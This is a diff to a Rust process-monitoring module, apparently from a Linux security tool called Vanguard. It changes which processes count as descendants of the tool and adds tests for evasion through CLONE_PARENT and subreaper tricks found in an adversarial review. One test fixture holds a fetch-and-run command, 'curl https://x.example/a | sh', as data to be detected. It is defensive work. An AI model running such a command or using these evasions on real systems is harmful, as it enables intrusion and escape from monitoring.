@@ -369,7 +369,8 @@ struct Fiche {
     /// Vanguard lui-même (son programme, ou le veilleur) : une racine. La marque ne passe pas aux enfants : un
     /// descendant est « de Vanguard » tant que la chaîne de ses parents connus mène à une racine encore là.
     racine: bool,
-    /// Le compte des entrées quand ce processus est devenu une racine : seuls les enfants entrés après sont de lui.
+    /// Le compte des entrées quand ce processus est devenu une racine à son dernier lancement : seuls les enfants entrés
+    /// après sont de lui. `u64::MAX` : un porteur (`Table::lancement`), dont aucun enfant n'est de Vanguard, ni lui.
     racine_depuis: u64,
     /// Sa naissance a été vue (une fourche) : sinon, rien ne dit qu'il est né après que son parent est devenu
     /// Vanguard (fiche lue au départ, ou oubliée puis refaite à un lancement).
@@ -384,6 +385,9 @@ struct Table {
     fiches: HashMap<u32, Fiche>,
     ordre: VecDeque<(u32, u64)>,
     entrees: u64,
+    /// Le compte des entrées au dernier oubli (fiches balayées ou évincées, événements perdus) : une fiche entrée avant
+    /// peut avoir perdu la trace d'un enfant.
+    oubli: u64,
 }
 
 fn nom_borne(nom: &str) -> String {
@@ -425,6 +429,9 @@ impl Table {
     /// oubliés d'un coup jusqu'à 7/8. Les racines (Vanguard) passent leur tour ; elles ne sont oubliées qu'en dernier
     /// recours, si la table n'était faite que d'elles.
     fn faire_de_la_place(&mut self, vivant: &dyn Fn(u32) -> bool) {
+        // Un mort balayé ici n'a pas encore vu sa fin traitée : il peut être l'enfant vivant d'un porteur au moment où
+        // son lancement en Vanguard sera lu.
+        self.oublier();
         self.fiches.retain(|&p, _| vivant(p));
         let mut a_voir = self.ordre.len();
         while self.fiches.len() > TABLE_APRES_BALAYAGE && a_voir > 0 {
@@ -458,11 +465,38 @@ impl Table {
         }
     }
 
+    /// Des fiches ont pu perdre la trace d'enfants (éviction, événements perdus).
+    fn oublier(&mut self) {
+        self.oubli = self.entrees;
+    }
+
+    /// Une fiche de la table a `pid` pour parent.
+    fn a_des_enfants(&self, pid: u32) -> bool {
+        self.fiches.iter().any(|(&p, f)| p != pid && f.parent == Some(pid))
+    }
+
     /// Un lancement : le nom et le parent lus (s'ils l'ont été), et `racine` si le programme est celui de Vanguard.
     /// Rien n'est repris de la marque d'avant : un processus qui lance autre chose que Vanguard n'est plus une racine.
-    /// Devenu Vanguard à ce lancement : ses enfants d'avant ne sont pas de lui (`racine_depuis`).
-    fn lancement(&mut self, pid: u32, lu: Option<&EnMarche>, racine: bool, vivant: &dyn Fn(u32) -> bool) {
+    ///
+    /// Devenu (ou relancé en) Vanguard à ce lancement : seuls les enfants entrés après sont de lui (`racine_depuis`,
+    /// remis à chaque lancement : lu en retard, le premier d'une suite d'exec voit déjà l'image du dernier, et les
+    /// enfants nés entre deux passaient). Un porteur, qui a peut-être un enfant vivant à ce moment (`enfants_vus` :
+    /// `/proc/<pid>/task/*/children` non vide ou illisible ; une fiche dont il est le parent ; sa fiche absente ou
+    /// d'avant un oubli), ne passe jamais la marque, et n'est pas de Vanguard lui-même : cet enfant d'avant l'exec
+    /// peut lui donner des frères (clone avec CLONE_PARENT, que le noyau annonce comme des fourches du porteur), ou
+    /// ses orphelins (PR_SET_CHILD_SUBREAPER survit à l'exec), que rien ne distingue des siens (relecture adverse du
+    /// lot L2(b), 3e ronde, A et B). Au pire, ce Vanguard-là voit ce qu'il lance jugé : une alerte de trop.
+    fn lancement(
+        &mut self,
+        pid: u32,
+        lu: Option<&EnMarche>,
+        racine: bool,
+        enfants_vus: bool,
+        vivant: &dyn Fn(u32) -> bool,
+    ) {
         let ancienne = self.fiches.get(&pid).cloned();
+        let porteur = racine
+            && (enfants_vus || self.a_des_enfants(pid) || ancienne.as_ref().is_none_or(|f| f.entree <= self.oubli));
         let parent = lu.and_then(|p| p.parent).or(ancienne.as_ref().and_then(|f| f.parent));
         let nom = lu.map_or_else(
             || ancienne.as_ref().map(|f| f.nom.clone()).unwrap_or_default(),
@@ -472,12 +506,34 @@ impl Table {
             Some(f) => {
                 f.parent = parent;
                 f.nom = nom_borne(&nom);
-                if racine && !f.racine {
-                    f.racine_depuis = self.entrees;
-                }
                 f.racine = racine;
+                f.racine_depuis = self.entrees;
             }
             None => self.inserer(pid, parent, &nom, racine, vivant),
+        }
+        if porteur {
+            self.porteur(pid);
+        }
+    }
+
+    /// À l'ouverture : chaque racine qui a des enfants dans la table est un porteur ; `moi` (ce processus) seulement
+    /// si `moi_porteur` (des enfants au début de `main`, ou illisibles), ses enfants d'après étant les siens.
+    fn porteurs_au_depart(&mut self, moi: u32, moi_porteur: bool) {
+        let porteurs: Vec<u32> = self
+            .fiches
+            .iter()
+            .filter(|&(&p, f)| f.racine && if p == moi { moi_porteur } else { self.a_des_enfants(p) })
+            .map(|(&p, _)| p)
+            .collect();
+        for p in porteurs {
+            self.porteur(p);
+        }
+    }
+
+    /// `pid` ne passe plus jamais la marque, ni ne la porte.
+    fn porteur(&mut self, pid: u32) {
+        if let Some(f) = self.fiches.get_mut(&pid) {
+            f.racine_depuis = u64::MAX;
         }
     }
 
@@ -1039,20 +1095,24 @@ impl Veilleur {
     /// Ouvre les deux flux. La table part des programmes déjà en marche ; les racines sont celles du bilan
     /// (`chasse::de_vanguard`) : le programme de Vanguard et ce processus, jamais leurs ancêtres (systemd de
     /// l'utilisateur, le terminal), dont tout ce qui est lancé serait sinon écarté. Les fiches lues ici n'ont pas vu
-    /// naître leurs processus : aucune ne reçoit la marque d'une racine (`Table::de_vanguard`). L'arrêt demandé pendant la
+    /// naître leurs processus : aucune ne reçoit la marque d'une racine (`Table::de_vanguard`). Une racine qui a déjà
+    /// des enfants est un porteur (`Table::lancement`) : rien ne dit qu'ils sont nés après son exec. Ce processus-ci le
+    /// sait mieux : ses enfants du début de `main` (`processus::enfants_d_avant`). L'arrêt demandé pendant la
     /// lecture de /proc, qui peut être longue sous charge, est vu avant de commencer.
     pub(crate) fn ouvrir() -> Result<Veilleur, Refus> {
         let connecteur = ouvrir_connecteur()?;
         let prises = ouvrir_prise(NETLINK_SOCK_DIAG, GROUPES_FINS_DE_PRISES);
         let soi = crate::protection::cle::soi::Soi::courant();
+        let moi = std::process::id();
+        let moi_porteur = crate::socle::processus::enfants_d_avant().is_none_or(|e| !e.is_empty());
         let mut table = Table::default();
         if let Some((liste, _)) = chasse::en_marche() {
-            let moi = std::process::id();
             for p in &liste {
                 let racine = p.pid == moi || soi.est_moi(p.pid, p.chemin.as_deref());
                 table.inserer(p.pid, p.parent, &p.nom, racine, &vivant);
             }
         }
+        table.porteurs_au_depart(moi, moi_porteur);
         if arret_demande() {
             return Err(Refus::Arrete);
         }
@@ -1096,6 +1156,8 @@ impl Veilleur {
         let n = match recevoir(&self.connecteur.0, &mut self.tampon) {
             Recu::Octets(n) => n,
             Recu::Perdus => {
+                // Une fourche perdue : l'enfant vivant d'un futur porteur peut manquer à la table.
+                self.table.oublier();
                 vus.push(Vu::Perdus(1));
                 return Ok(true);
             }
@@ -1142,7 +1204,7 @@ impl Veilleur {
 
     fn lancement(&mut self, pid: u32) -> Option<Lance> {
         if !self.lire {
-            self.table.lancement(pid, None, false, &vivant);
+            self.table.lancement(pid, None, false, false, &vivant);
             return None;
         }
         let maintenant = Instant::now();
@@ -1165,7 +1227,9 @@ impl Veilleur {
         let le_mien = lu
             .filter(|p| p.chemin.is_some())
             .is_some_and(|p| crate::protection::cle::soi::Soi::courant().est_moi(pid, p.chemin.as_deref()));
-        self.table.lancement(pid, lu, le_mien, &vivant);
+        // Ses enfants de maintenant : illisibles, il en a peut-être.
+        let enfants_vus = le_mien && crate::socle::processus::enfants(pid).is_none_or(|e| !e.is_empty());
+        self.table.lancement(pid, lu, le_mien, enfants_vus, &vivant);
         Some(Lance {
             pid,
             parent: lu.and_then(|p| p.parent).or_else(|| self.table.parent(pid)),
@@ -5080,7 +5144,7 @@ mod tests {
         t.inserer(1, None, "systemd", false, &tous);
         t.fourche(1, 10, &tous);
         let npm = en_marche(10, "npm", None);
-        t.lancement(10, Some(&EnMarche { parent: Some(1), ..npm }), false, &tous);
+        t.lancement(10, Some(&EnMarche { parent: Some(1), ..npm }), false, false, &tous);
         t.fourche(10, 11, &tous);
         t.lancement(
             11,
@@ -5088,6 +5152,7 @@ mod tests {
                 parent: Some(10),
                 ..en_marche(11, "node", None)
             }),
+            false,
             false,
             &tous,
         );
@@ -5099,6 +5164,7 @@ mod tests {
                 ..en_marche(12, "sh", None)
             }),
             false,
+            false,
             &tous,
         );
         assert_eq!(t.lignee(12), ["systemd", "npm", "node", "sh"]);
@@ -5109,6 +5175,7 @@ mod tests {
                 parent: Some(12),
                 ..en_marche(13, "curl", None)
             }),
+            false,
             false,
             &tous,
         );
@@ -5126,6 +5193,7 @@ mod tests {
                 parent: Some(30),
                 ..en_marche(31, "notify-send", None)
             }),
+            false,
             false,
             &tous,
         );
@@ -5191,9 +5259,10 @@ mod tests {
         assert!(t.fiches.get(&1).is_some_and(|f| f.racine));
     }
 
-    /// HAUTE (relecture adverse du lot L2(b), 2e ronde, N1) : un programme lance un enfant, puis se remplace (exec)
-    /// par Vanguard. Lui est Vanguard, et ce qu'il lance ensuite ; l'enfant d'avant et sa descendance, non. Une fiche
-    /// oubliée puis refaite à son lancement (naissance pas vue) n'est jamais de Vanguard.
+    /// HAUTE (relecture adverse du lot L2(b), 2e ronde, N1, et 3e ronde, A) : un programme lance un enfant, puis se
+    /// remplace (exec) par Vanguard. Ce porteur ne passe jamais la marque : ni à l'enfant d'avant, ni à ce qu'il lance
+    /// ensuite, que rien ne distingue des frères que cet enfant peut lui donner. Sans enfant au lancement, Vanguard
+    /// la passe. Une fiche oubliée puis refaite à son lancement (naissance pas vue) n'est jamais de Vanguard.
     #[test]
     fn un_porteur_ne_passe_pas_la_marque() {
         let tous = |_: u32| true;
@@ -5203,25 +5272,184 @@ mod tests {
         };
         let mut t = Table::default();
         t.inserer(1, None, "systemd", false, &tous);
+        // Sans enfant : Vanguard et ce qu'il lance.
         t.fourche(1, 70, &tous);
-        t.lancement(70, Some(&lu(70, 1, "sh")), false, &tous);
-        t.fourche(70, 71, &tous);
-        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, &tous);
+        t.lancement(70, Some(&lu(70, 1, "sh")), false, false, &tous);
+        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, false, &tous);
         t.fourche(70, 72, &tous);
-        t.fourche(71, 73, &tous);
-        t.lancement(71, Some(&lu(71, 70, "sleep")), false, &tous);
         assert!(t.de_vanguard(70) && t.de_vanguard(72));
-        assert!(
-            !t.de_vanguard(71) && !t.de_vanguard(73),
-            "l'enfant d'avant l'exec, de Vanguard"
-        );
         t.fin(72);
-        t.lancement(72, Some(&lu(72, 70, "journalctl")), false, &tous);
+        t.lancement(72, Some(&lu(72, 70, "journalctl")), false, false, &tous);
         assert!(!t.de_vanguard(72), "une naissance pas vue, de Vanguard");
-        // Relancé en Vanguard sans cesser de l'être : ses enfants restent les siens.
+        // Un enfant d'avant dans la table : porteur.
+        t.fourche(1, 80, &tous);
+        t.lancement(80, Some(&lu(80, 1, "sh")), false, false, &tous);
+        t.fourche(80, 81, &tous);
+        t.lancement(80, Some(&lu(80, 1, "vanguard")), true, false, &tous);
+        t.fourche(80, 82, &tous);
+        t.fourche(81, 83, &tous);
+        assert!(
+            ![80, 81, 82, 83].iter().any(|&p| t.de_vanguard(p)),
+            "un porteur, ou un enfant d'un porteur, de Vanguard"
+        );
+        // Un enfant vu dans /proc seulement (sa fourche jamais vue) : porteur aussi.
+        t.fourche(1, 90, &tous);
+        t.lancement(90, Some(&lu(90, 1, "vanguard")), true, true, &tous);
+        t.fourche(90, 91, &tous);
+        assert!(!t.de_vanguard(90) && !t.de_vanguard(91), "des enfants dans /proc");
+        // Sa fiche absente (naissance pas vue), ou entrée avant un oubli : peut-être des enfants perdus.
+        t.lancement(95, Some(&lu(95, 1, "vanguard")), true, false, &tous);
+        t.fourche(95, 96, &tous);
+        assert!(!t.de_vanguard(96), "une racine sans fiche d'avant");
+        t.fourche(1, 97, &tous);
+        t.oublier();
+        t.lancement(97, Some(&lu(97, 1, "vanguard")), true, false, &tous);
+        t.fourche(97, 98, &tous);
+        assert!(!t.de_vanguard(98), "une racine entrée avant un oubli");
+        t.fourche(1, 99, &tous);
+        t.lancement(99, Some(&lu(99, 1, "vanguard")), true, false, &tous);
+        t.fourche(99, 100, &tous);
+        assert!(t.de_vanguard(100), "une racine entrée après l'oubli");
+        // Relancé en Vanguard avec ses propres enfants : porteur lui aussi (rien ne les date), échec fermé.
         t.fourche(70, 74, &tous);
-        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, &tous);
-        assert!(t.de_vanguard(74));
+        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, false, &tous);
+        assert!(!t.de_vanguard(74));
+    }
+
+    /// HAUTE (relecture adverse du lot L2(b), 3e ronde, A) : `sh` lance C, puis se remplace par Vanguard (P). C clone
+    /// D avec CLONE_PARENT : le noyau annonce une fourche de P, D naît vu, après l'exec. Ou P s'est fait « subreaper »
+    /// (PR_SET_CHILD_SUBREAPER survit à l'exec) : l'enfant G de C, orphelin, est rattaché à P et son lancement relit
+    /// ce parent. Ni D ni G ne sont de Vanguard.
+    #[test]
+    fn clone_parent_et_subreaper_ne_passent_pas_la_marque() {
+        let tous = |_: u32| true;
+        let lu = |pid: u32, parent: u32, nom: &str| EnMarche {
+            parent: Some(parent),
+            ..en_marche(pid, nom, None)
+        };
+        let mut t = Table::default();
+        t.inserer(1, None, "systemd", false, &tous);
+        t.fourche(1, 70, &tous);
+        t.lancement(70, Some(&lu(70, 1, "sh")), false, false, &tous);
+        t.fourche(70, 71, &tous);
+        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, false, &tous);
+        // CLONE_PARENT : annoncé comme une fourche de P.
+        t.fourche(70, 75, &tous);
+        t.lancement(75, Some(&lu(75, 70, "sh")), false, false, &tous);
+        assert!(!t.de_vanguard(75), "CLONE_PARENT");
+        // Subreaper : G né de C après l'exec, C finit, G relu avec P pour parent.
+        t.fourche(71, 76, &tous);
+        t.fin(71);
+        t.lancement(76, Some(&lu(76, 70, "sh")), false, false, &tous);
+        assert!(!t.de_vanguard(76), "subreaper");
+        // Même chose quand C n'est connu que de /proc (sa fourche perdue).
+        t.fourche(1, 80, &tous);
+        t.lancement(80, Some(&lu(80, 1, "vanguard")), true, true, &tous);
+        t.fourche(80, 85, &tous);
+        assert!(!t.de_vanguard(85), "CLONE_PARENT, C vu dans /proc seulement");
+    }
+
+    /// HAUTE/MOYENNE (relecture adverse du lot L2(b), 3e ronde, B) : E1 lance un petit programme, qui lance F, puis E2
+    /// le vrai Vanguard. Lu en retard, E1 voit déjà l'image de E2 : P est une racine avant la fourche de F. E2 remet
+    /// `racine_depuis` : F, né entre les deux, n'est pas de Vanguard.
+    #[test]
+    fn chaque_lancement_de_vanguard_remet_la_date() {
+        let tous = |_: u32| true;
+        let lu = |pid: u32, parent: u32, nom: &str| EnMarche {
+            parent: Some(parent),
+            ..en_marche(pid, nom, None)
+        };
+        let mut t = Table::default();
+        t.inserer(1, None, "systemd", false, &tous);
+        t.fourche(1, 70, &tous);
+        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, false, &tous);
+        t.fourche(70, 71, &tous);
+        t.lancement(70, Some(&lu(70, 1, "vanguard")), true, false, &tous);
+        assert!(!t.de_vanguard(71), "né entre deux exec");
+        // Sans enfant au second lancement, la date est quand même remise.
+        t.fourche(1, 80, &tous);
+        t.lancement(80, Some(&lu(80, 1, "vanguard")), true, false, &tous);
+        t.fourche(1, 81, &tous);
+        t.lancement(80, Some(&lu(80, 1, "vanguard")), true, false, &tous);
+        assert_eq!(t.fiches[&80].racine_depuis, t.entrees);
+    }
+
+    /// À l'ouverture du veilleur, les fiches lues n'ont pas vu naître leurs enfants : une racine qui en a est un
+    /// porteur. Ce processus-ci (`moi`) seulement s'il en avait au début de `main`.
+    #[test]
+    fn porteurs_a_l_ouverture() {
+        let tous = |_: u32| true;
+        for moi_porteur in [false, true] {
+            let mut t = Table::default();
+            t.inserer(1, None, "systemd", false, &tous);
+            t.inserer(30, Some(1), "vanguard", true, &tous);
+            t.inserer(31, Some(30), "sh", false, &tous);
+            t.inserer(40, Some(1), "vanguard", true, &tous);
+            t.inserer(50, Some(1), "vanguard", true, &tous);
+            t.inserer(51, Some(50), "journalctl", false, &tous);
+            t.porteurs_au_depart(50, moi_porteur);
+            t.fourche(30, 32, &tous);
+            t.fourche(40, 41, &tous);
+            t.fourche(50, 52, &tous);
+            assert!(!t.de_vanguard(32), "une racine avec un enfant au départ");
+            assert!(t.de_vanguard(41));
+            assert_eq!(t.de_vanguard(52), !moi_porteur);
+        }
+    }
+
+    /// Le vrai noyau : un clone avec CLONE_PARENT donne au nouveau processus le parent de celui qui clone, et
+    /// `processus::enfants` le voit chez ce parent (pas chez nous) ; donné à la table, ce parent est un porteur.
+    /// L'enfant ne fait que des appels système (pause, alarm, _exit), sûr après un clone d'un processus à plusieurs
+    /// fils ; il est tué à la fin, même sur un échec, et l'alarme l'arrête de toute façon.
+    #[test]
+    fn clone_parent_vu_chez_le_grand_parent() {
+        struct Tuer(libc::pid_t);
+        impl Drop for Tuer {
+            fn drop(&mut self) {
+                // SAFETY: un signal à un numéro rendu par clone, un entier ; aucun pointeur.
+                unsafe {
+                    libc::kill(self.0, libc::SIGKILL);
+                }
+            }
+        }
+        let flags = libc::c_ulong::try_from(libc::CLONE_PARENT | libc::SIGCHLD).unwrap();
+        // SAFETY: clone sans nouvelle pile (0) se comporte comme fork : l'enfant (0) reprend sur une copie de la
+        // mémoire et ne fait ensuite que des appels système sur des entiers, puis ne rend jamais la main (pause en
+        // boucle, alarme, `_exit`) : aucune allocation, aucun verrou, aucun destructeur du parent.
+        let r = unsafe { libc::syscall(libc::SYS_clone, flags, 0_usize, 0_usize, 0_usize, 0_usize) };
+        if r == 0 {
+            // SAFETY: voir ci-dessus.
+            unsafe {
+                libc::alarm(60);
+                loop {
+                    libc::pause();
+                }
+            }
+        }
+        if r < 0 {
+            return crate::essais::saute("clone(CLONE_PARENT) refusé ici");
+        }
+        let d = libc::pid_t::try_from(r).unwrap();
+        let _tuer = Tuer(d);
+        let d = u32::try_from(d).unwrap();
+        let grand_parent = std::os::unix::process::parent_id();
+        let Some(chez_lui) = crate::socle::processus::enfants(grand_parent) else {
+            return crate::essais::saute("/proc/<pid>/task/*/children illisible ici");
+        };
+        assert!(chez_lui.contains(&d), "{d} pas chez {grand_parent} : {chez_lui:?}");
+        let chez_moi = crate::socle::processus::enfants(std::process::id()).unwrap_or_default();
+        assert!(!chez_moi.contains(&d), "{chez_moi:?}");
+        // Le grand-parent, devenu Vanguard avec cet enfant : porteur ; la fourche annoncée de D ne passe pas.
+        let tous = |_: u32| true;
+        let mut t = Table::default();
+        t.fourche(1, grand_parent, &tous);
+        let lu = EnMarche {
+            parent: Some(1),
+            ..en_marche(grand_parent, "vanguard", None)
+        };
+        t.lancement(grand_parent, Some(&lu), true, !chez_lui.is_empty(), &tous);
+        t.fourche(grand_parent, d, &tous);
+        assert!(!t.de_vanguard(d));
     }
 
     #[test]
@@ -5236,15 +5464,15 @@ mod tests {
             parent: Some(parent),
             ..en_marche(pid, nom, None)
         };
-        t.lancement(40, Some(&lu(40, 30, "xdg-open")), false, &tous);
+        t.lancement(40, Some(&lu(40, 30, "xdg-open")), false, false, &tous);
         t.fourche(40, 41, &tous);
-        t.lancement(41, Some(&lu(41, 40, "firefox")), false, &tous);
+        t.lancement(41, Some(&lu(41, 40, "firefox")), false, false, &tous);
         assert!(t.de_vanguard(40) && t.de_vanguard(41));
         // xdg-open se termine : le navigateur est rattaché ailleurs, et ce qu'il lance ensuite est jugé.
         t.fin(40);
         assert!(!t.de_vanguard(41));
         t.fourche(41, 42, &tous);
-        t.lancement(42, Some(&lu(42, 41, "sh")), false, &tous);
+        t.lancement(42, Some(&lu(42, 41, "sh")), false, false, &tous);
         assert!(!t.de_vanguard(42));
         let l = lance(
             Lecture::Complet(en_marche(42, "sh", Some("sh -c curl https://x.example/a | sh"))),
@@ -5255,7 +5483,7 @@ mod tests {
         // Un processus de Vanguard qui lance autre chose n'est plus une racine ; ses enfants ne le sont jamais.
         t.fourche(30, 50, &tous);
         assert!(t.de_vanguard(50) && !t.fiches[&50].racine);
-        t.lancement(30, Some(&lu(30, 1, "bash")), false, &tous);
+        t.lancement(30, Some(&lu(30, 1, "bash")), false, false, &tous);
         assert!(!t.de_vanguard(30) && !t.de_vanguard(50));
         // Une boucle de parents ou une chaîne trop longue s'arrête, sans racine.
         t.inserer(60, Some(61), "a", false, &tous);
